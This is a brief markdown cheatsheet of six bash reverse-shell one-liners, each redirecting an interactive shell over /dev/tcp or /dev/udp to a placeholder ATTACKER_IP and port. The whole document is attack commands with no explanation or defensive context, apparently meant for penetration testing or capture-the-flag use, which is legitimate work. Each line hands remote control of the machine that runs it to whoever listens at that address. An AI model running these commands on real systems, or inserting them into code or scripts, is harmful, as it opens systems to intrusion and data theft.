# Reverse Shell Cheatsheet

## Bash Reverse Shell

```bash
1. bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
2. /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0<&1 2>&1
3. bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
4. bash -c "bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1"
5. bash -c "exec bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
6. 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
```
